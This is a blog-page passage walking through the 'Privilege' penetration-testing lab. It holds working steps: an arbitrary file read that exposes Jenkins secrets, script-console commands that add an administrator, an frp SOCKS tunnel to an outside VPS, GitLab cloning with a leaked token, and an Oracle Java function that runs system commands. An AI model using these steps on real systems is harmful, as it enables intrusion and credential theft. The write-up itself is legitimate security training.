@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="en">
+    
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <meta name="description" content="春秋云镜Privilege-wp" />
+    <meta name="hexo-theme-A4" content="v1.8.8" />
+    <link rel="alternate icon" type="image/webp" href="/img/favicon.webp">
+    <title>Hexo</title>
+
+    
+        
+<link rel="stylesheet" href="/css/highlight/style1.css">
+
+        
+<link rel="stylesheet" href="/css/reset.css">
+
+        
+<link rel="stylesheet" href="/css/markdown.css">
+
+        
+<link rel="stylesheet" href="/css/fonts.css">
+ 
+         <!--注意：首页既不是post也不是page-->
+        
+            
+<link rel="stylesheet" href="/css/waline.css">
+
+        
+        
+        
+<link rel="stylesheet" href="/css/ui.css">
+ 
+        
+<link rel="stylesheet" href="/css/style.css">
+
+
+        
+            <!--返回顶部css-->
+            
+<link rel="stylesheet" href="/css/returnToTop.css">
+
+            
+<link rel="stylesheet" href="/css/unicons.css">
+
+        
+        
+            <!--目录-->
+            
+<link rel="stylesheet" href="/css/toc.css">
+
+        
+    
+
+    
+        
+<link rel="stylesheet" href="/css/returnToLastPage.css">
+
+    
+    
+   
+<link rel="stylesheet" href="/css/lightgallery.min.css">
+
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+    
+    <style>
+        :root {
+            --waline-theme-color: #000000; 
+            --waline-color: #000000; 
+            --waline-border-color: #000000; 
+            --waline-white: #000000; 
+            --waline-bgcolor-light: #ffffff;  
+        }
+        body {
+            color: #000000;
+            background: #e4e4e4;
+        }
+        .post-md code {
+            background: #212425;
+            color: white; 
+        }
+        .post-md pre, .post-md .highlight {
+            background: #212425;
+            color: white; 
+        }
+        pre .string, pre .value, pre .inheritance, pre .header, pre .ruby .symbol, pre .xml .cdata {
+            color: #000000;
+        }
+        pre .number, pre .preprocessor, pre .built_in, pre .literal, pre .params, pre .constant {
+            color: #000000;
+        }
+        .year-font-color {
+            color: #000000 !important;
+        }
+        .wl-card span.wl-nick {
+            color: #000000; 
+        }
+        .wl-card .wl-badge {
+            border: 1px solid #000000;
+            color: #000000; 
+        }
+        .wl-btn {
+            border: 1px solid #000000; 
+            color:  #000000;  
+        }
+        .wl-btn.primary {
+            color: #ffffff; 
+        }
+        .wl-header label {
+            color: #000000;
+        }
+        a {
+            color: rgb(239, 112, 96);
+        }
+
+        .post-md a {
+            color: rgb(239, 112, 96);
+        }
+
+        .nav li a {
+            color: rgb(239, 112, 96);
+        }
+
+        .archive-main a:link {
+            color: rgb(239, 112, 96);
+        }
+        .archive-main a:visited {
+            color: rgb(239, 112, 96); 
+        }
+
+        .archive li span {
+            color: #000000;
+        }
+
+        .post-main-title {
+            color: #000000;
+        }
+
+        .post-md h1,
+        .post-md h2,
+        .post-md h3,
+        .post-md h4,
+        .post-md h5,
+        .post-md h6 {
+            color: #000000;
+        }
+
+        [data-waline] p {
+            color: #000000;
+        }
+        [data-waline] a {
+            color: #000000;
+        } 
+        .wl-sort li.active {
+            color: #000000;
+        }
+
+        .wl-card .wl-meta>span {
+            background: #ffffff;
+        }
+
+        .paper {
+            background: #e4e4e4;
+        }
+
+        .index-main {
+            background: #ffffff;
+        }
+
+        .paper-main {
+            background: #ffffff;
+        }
+
+        .wl-panel {
+            background: #ffffff;
+        }
+
+        .archive li:nth-child(odd) {
+            background: #ffffff;
+            ;
+        }
+
+        .archive li:nth-child(even) {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(odd) td {
+            background: #ffffff;
+        }
+
+        .post-md table tr:nth-child(even) td {
+            background: #ffffff;
+        }
+
+    
+        .progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+        .return-to-last-progress-wrap::after {
+            color: #000000; /* 箭头的颜色 */
+        }
+        .return-to-last-progress-wrap svg.progress-circle path {
+	        stroke: #000000; /* 边框的颜色 */
+        }
+        .return-to-last-progress-wrap::before {
+	        background-image: linear-gradient(298deg, rgb(239, 112, 96), rgb(239, 112, 96)); /* 鼠标滑过的箭头颜色 */
+         }
+
+         .left-toc-container::-webkit-scrollbar-thumb {
+            background-color: #000000; /* 设置滚动条拖动块的颜色 */
+        }
+
+        .bs-docs-sidebar .nav>.active>a,
+        .bs-docs-sidebar .nav>li>a:hover,
+        .bs-docs-sidebar .nav>li>a:focus {
+            color: rgb(239, 112, 96);
+            border-left-color: rgb(239, 112, 96);
+        }
+        .bs-docs-sidebar .nav>li>a {
+            color:  #000000;
+        }
+    </style>
+
+    
+    <body>
+        
+            <div class="left-toc-container">
+                <nav id="toc" class="bs-docs-sidebar"></nav>
+            </div>
+        
+        <div class="paper">
+            
+            
+            
+            
+                <div class="shadow-drop-2-bottom paper-main">
+                    
+
+
+<div class="header">
+    <div class="header-container">
+        <img style="
+        width: 56px;
+        height: auto;" alt="^-^" cache-control="max-age=86400" class="header-img" src="/img/favicon.webp" width="10%"></img>
+        <div class="header-content">
+            <a class="logo" href="/">Hexo</a> 
+            <span class="description"></span> 
+        </div>
+        
+    </div>
+    
+   
+    <ul class="nav">
+        
+            
+                <li><a href="/">首页</a></li>
+            
+        
+            
+                <li><a href="/list/">文章</a></li>
+            
+        
+            
+                <li><a href="/tags/">标签</a></li>
+            
+        
+            
+                <li><a href="/categories/">分类</a></li>
+            
+        
+            
+                <li><a href="/about/">关于</a></li>
+            
+        
+            
+                <li><a href="/friends/">友链</a></li>
+            
+        
+    </ul>
+</div> 
+        
+                    
+                    
+
+                    
+                    
+                    
+                    <!--说明是文章post页面-->
+                    
+                        <div class="post-main">
+
+    
+        <div class="post-main-title">
+            春秋云镜Privilege-wp
+        </div>
+      
+    
+
+    <div class="post-md">
+        
+            
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%A4%96%E7%BD%91%E6%89%93%E7%82%B9"><span class="post-toc-text">外网打点</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag01"><span class="post-toc-text">flag01</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="post-toc-text">内网渗透</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag02"><span class="post-toc-text">flag02</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag03"><span class="post-toc-text">flag03</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#flag04"><span class="post-toc-text">flag04</span></a></li></ol></li></ol>
+            
+        
+        <link rel="stylesheet" type="text/css" href="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/css/lightgallery.min.css" /><div class=".article-gallery"><blockquote>
+<p>涉及知识点：</p>
+<p>jenkins敏感信息泄露</p>
+<p>oracle命令执行</p>
+<p>SeRestorePrivilege权限替换文件</p>
+<p>diskshadow卷影副本转储ntds.dit</p>
+</blockquote>
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>先用rustscan扫描一下端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">rustscan -a 39.99.130.246 -r 1-65535</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">25/tcp    open  smtp          syn-ack</span><br><span class="line">80/tcp    open  http          syn-ack</span><br><span class="line">110/tcp   open  pop3          syn-ack</span><br><span class="line">3306/tcp  open  mysql         syn-ack</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack</span><br><span class="line">8080/tcp  open  http-proxy    syn-ack</span><br><span class="line">15774/tcp open  unknown       syn-ack</span><br><span class="line">47001/tcp open  winrm         syn-ack</span><br><span class="line">49664/tcp open  unknown       syn-ack</span><br><span class="line">49665/tcp open  unknown       syn-ack</span><br><span class="line">49666/tcp open  unknown       syn-ack</span><br><span class="line">49667/tcp open  unknown       syn-ack</span><br><span class="line">49669/tcp open  unknown       syn-ack</span><br><span class="line">49670/tcp open  unknown       syn-ack</span><br><span class="line">49678/tcp open  unknown       syn-ack</span><br><span class="line">49681/tcp open  unknown       syn-ack</span><br></pre></td></tr></table></figure>
+
+<p>不知道为什么，rustscan扫了一些无关的端口出来，这里主要关注的就是<code>80</code>,<code>3306</code>,<code>8080</code>,<code>3389</code></p>
+<p>可以知道，这个是windows服务器</p>
+<p>80端口是XR SHOP，8080是Jenkins服务</p>
+<p>XR SHOP是用wordpress搭建的，先尝试有没有弱口令</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181439134.png" title="image-20231018143916592" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181439134.png" alt="image-20231018143916592"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181443544.png" title="image-20231018144320459" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181443544.png" alt="image-20231018144320459"></a></p>
+<p>爆了3000个密码，没报出来</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181449401.png" title="image-20231018144949323" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181449401.png" alt="image-20231018144949323"></a></p>
+<p>然后用dirsearch扫目录，发现了备份文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181450262.png" title="image-20231018145010152" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181450262.png" alt="image-20231018145010152"></a></p>
+<p>下载下来直接开审，有一个任意文件读取的地方</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181507346.png" title="image-20231018150724255" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181507346.png" alt="image-20231018150724255"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$logfile</span> = <span class="title function_ invoke__">rawurldecode</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;logfile&#x27;</span>] );</span><br><span class="line"><span class="comment">// Make sure the file is exist.</span></span><br><span class="line"><span class="keyword">if</span> ( <span class="title function_ invoke__">file_exists</span>( <span class="variable">$logfile</span> ) ) &#123;</span><br><span class="line">  <span class="comment">// Get the content and echo it.</span></span><br><span class="line">  <span class="variable">$text</span> = <span class="title function_ invoke__">file_get_contents</span>( <span class="variable">$logfile</span> );</span><br><span class="line">  <span class="keyword">echo</span>( <span class="variable">$text</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>利用路径为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://39.99.130.246/tools/content-log.php?logfile=C:\Windows\System32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>
+
+<p>权限比较高，可以直接读系统文件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181509605.png" title="image-20231018150900550" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181509605.png" alt="image-20231018150900550"></a></p>
+<p>然后根据提示，jenkis目录为<code>C:\ProgramData\Jenkins\.jenkins</code></p>
+<p>在<code>C:\ProgramData\Jenkins\.jenkins\secrets\initialAdminPassword</code>读取初始管理员密码</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181515636.png" title="image-20231018151534585" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181515636.png" alt="image-20231018151534585"></a></p>
+<p>然后利用<code>admin/510235cf43f14e83b88a9f144199655b</code>登录，进入jenkins后台</p>
+<p>然后在执行脚本的地方可以执行系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println &#x27;whoami&#x27;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181527454.png" title="image-20231018152703377" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181527454.png" alt="image-20231018152703377"></a></p>
+<p>可以看到是system权限，而且他开了3389端口，所以直接添加rdp用户。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">println &#x27;net user v2i 123456@qwe /add&#x27;.execute().text</span><br><span class="line">println &#x27;net localgroup administrators v2i /add&#x27;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181541857.png" title="image-20231018154139788" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181541857.png" alt="image-20231018154139788"></a></p>
+<p>然后利用<code>v2i/123456@qwe</code>登录远程桌面，我是用的<code>remmina</code>这个软件</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181544883.png" title="image-20231018154443805" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181544883.png" alt="image-20231018154443805"></a></p>
+<h3 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h3><p>获得flag01: <code>flag&#123;4088d1e2-1c65-420a-802e-62904c789273&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181545618.png" title="image-20231018154523543" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181545618.png" alt="image-20231018154523543"></a></p>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><p>然后返回jenkins上</p>
+<p>在<code>http://39.99.130.246:8080/manage/configure</code>得到gitlab地址</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181549425.png" title="image-20231018154904343" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181549425.png" alt="image-20231018154904343"></a></p>
+<p>然后去找他的api token，下面的这个唯一标识只是他api token的id</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181842631.png" title="image-20231018184225544" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181842631.png" alt="image-20231018184225544"></a></p>
+<p>在<code>C:\ProgramData\Jenkins\.jenkins\credentials.xml</code>找到api token：<code>&#123;AQAAABAAAAAg9+7GBocqYmo0y3H+uDK9iPsvst95F5i3QO3zafrm2TC5U24QCq0zm/GEobmrmLYh&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181859140.png" title="image-20231018185923040" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181859140.png" alt="image-20231018185923040"></a></p>
+<p>因为这个插件里的凭据都是加了密的，需要在jenkins里解密（md，问了chatgpt半天才肯告诉我）</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181918703.png" title="image-20231018191842610" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181918703.png" alt="image-20231018191842610"></a></p>
+<p>然后。这里应该是在内网上面的gitlab服务</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181551489.png" title="image-20231018155113418" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181551489.png" alt="image-20231018155113418"></a></p>
+<p>先配置一下内网隧道</p>
+<p>这里使用frp来搭建内网隧道</p>
+<p>服务端：<code>frps.toml</code></p>
+<figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">9998</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps1.toml</span><br></pre></td></tr></table></figure>
+
+<p>客户端：<code>frpc.toml</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = &lt;vpsip&gt;</span><br><span class="line">server_port = 9998</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 1000 #需要vps打开对应的端口</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frpc.exe -c frpc1.toml</span><br></pre></td></tr></table></figure>
+
+<p>先看看他gitlab的域名的ip是多少</p>
+<p>查看他的hosts文件，可以得知其ip为<code>172.22.14.16</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181830977.png" title="image-20231018183032872" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181830977.png" alt="image-20231018183032872"></a></p>
+<p>然后配置一下proxifier代理</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181919357.png" title="image-20231018191927323" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181919357.png" alt="image-20231018191927323"></a></p>
+<p>列出gitlab里的项目列表</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --header <span class="string">&quot;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&quot;</span> <span class="string">&quot;http://172.22.14.16/api/v4/projects&quot;</span> &gt; 1.txt</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181933341.png" title="image-20231018193327254" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181933341.png" alt="image-20231018193327254"></a></p>
+<p>找到几个看起来比较敏感的仓库</p>
+<p>使用命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> http://admin:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/internal-secret.git</span><br><span class="line">git <span class="built_in">clone</span> http://admin:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xrwiki.git</span><br><span class="line">git <span class="built_in">clone</span> http://admin:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/awenode.git</span><br><span class="line">git <span class="built_in">clone</span> http://admin:glpat-7kD_qLH2PiQv_ywB9hz2@172.22.14.16/xrlab/xradmin.git</span><br></pre></td></tr></table></figure>
+
+<p>将他们拉取下来</p>
+<p>在xradmin里找打数据库账户密码：<code>xradmin/fcMyE8t9E4XdsKf</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181940278.png" title="image-20231018194030175" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310181940278.png" alt="image-20231018194030175"></a></p>
+<p>用navicat连接，但是会报错</p>
+<p>根据下面的文章进行解决</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38974638/article/details/115069664">Oracle ORA-28547:connection to server failed,probable Oracle Net admin error问题解决</a></p>
+<h3 id="flag02"><a href="#flag02" class="headerlink" title="flag02"></a>flag02</h3><p><strong>连接的时候要选择角色为DBA</strong></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182035568.png" title="image-20231018203528516" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182035568.png" alt="image-20231018203528516"></a></p>
+<p>查看当前用户是否为DBA</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182038426.png" title="image-20231018203811376" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182038426.png" alt="image-20231018203811376"></a></p>
+<p>查看oracle数据库版本</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182039572.png" title="image-20231018203904528" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182039572.png" alt="image-20231018203904528"></a></p>
+<p>创建java source：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">declare</span> sql_command varchar2(<span class="number">32767</span>);</span><br><span class="line"><span class="keyword">begin</span> sql_command :<span class="operator">=</span> <span class="string">&#x27;create or replace and compile java source named &quot;Command&quot;</span></span><br><span class="line"><span class="string">as</span></span><br><span class="line"><span class="string">import java.io.ByteArrayOutputStream;</span></span><br><span class="line"><span class="string">import java.io.InputStream;</span></span><br><span class="line"><span class="string">public class Command &#123;</span></span><br><span class="line"><span class="string">    public static String exec(String cmd) throws Exception&#123;</span></span><br><span class="line"><span class="string">        Process process = Runtime.getRuntime().exec(cmd);</span></span><br><span class="line"><span class="string">        InputStream input = process.getInputStream();</span></span><br><span class="line"><span class="string">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span></span><br><span class="line"><span class="string">        int n;</span></span><br><span class="line"><span class="string">        byte[] buffer = new byte[1024];</span></span><br><span class="line"><span class="string">        while ((n = input.read(buffer)) != -1) &#123;</span></span><br><span class="line"><span class="string">            baos.write(buffer);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        return baos.toString();</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">execute</span> immediate sql_command;</span><br><span class="line"><span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
+
+<p>创建函数：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace <span class="keyword">function</span> <span class="keyword">exec</span>(cmd varchar2) <span class="keyword">return</span> varchar2 <span class="keyword">as</span> <span class="keyword">language</span> java name <span class="string">&#x27;Command.exec(java.lang.String) return java.lang.String&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>赋予需要的三个java权限：</p>
+<blockquote>
+<p>当前用户为DBA时，通常只需要为该用户赋予第一个执行权限即可，实际情况中具体需要哪一个可以直接执行函数来看报错提示</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182045530.png" title="image-20231018204525476" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182045530.png" alt="image-20231018204525476"></a></p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">begin</span> dbms_java.grant_permission( <span class="string">&#x27;XRADMIN&#x27;</span>, <span class="string">&#x27;SYS:java.io.FilePermission&#x27;</span>, <span class="string">&#x27;&lt;&lt;ALL FILES&gt;&gt;&#x27;</span>, <span class="string">&#x27;read,write,execute,delete&#x27;</span>);<span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">begin</span> dbms_java.grant_permission( <span class="string">&#x27;XRADMIN&#x27;</span>, <span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;writeFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span>);<span class="keyword">end</span>;</span><br><span class="line"><span class="keyword">begin</span> dbms_java.grant_permission( <span class="string">&#x27;XRADMIN&#x27;</span>, <span class="string">&#x27;SYS:java.lang.RuntimePermission&#x27;</span>, <span class="string">&#x27;readFileDescriptor&#x27;</span>, <span class="string">&#x27;&#x27;</span> );<span class="keyword">end</span>;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182044509.png" title="image-20231018204400458" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182044509.png" alt="image-20231018204400458"></a></p>
+<p>执行命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exec</span>(<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">from</span> dual; </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182056711.png" title="image-20231018205628656" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182056711.png" alt="image-20231018205628656"></a></p>
+<p>然后添加个用户，通过rdp登录</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">exec</span>(<span class="string">&#x27;net user v2i 123456@qwe /add&#x27;</span>) <span class="keyword">from</span> dual; </span><br><span class="line"><span class="keyword">select</span> <span class="keyword">exec</span>(<span class="string">&#x27;net localgroup administrators v2i /add&#x27;</span>) <span class="keyword">from</span> dual; </span><br></pre></td></tr></table></figure>
+
+<p>当然也可以直接通过命令看，我这里是先入为主了，之前没有查看当前端口是否打开</p>
+<p>得到flag02: <code>flag&#123;840b4d80-ba9f-4c63-8268-3a15b953d257&#125;</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182104520.png" title="image-20231018210404413" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202310182104520.png" alt="image-20231018210404413"></a></p>
+<p>再回到原来那个主机，上传fscan，扫描一下内网</p>
+<p>得到以下结果</p>
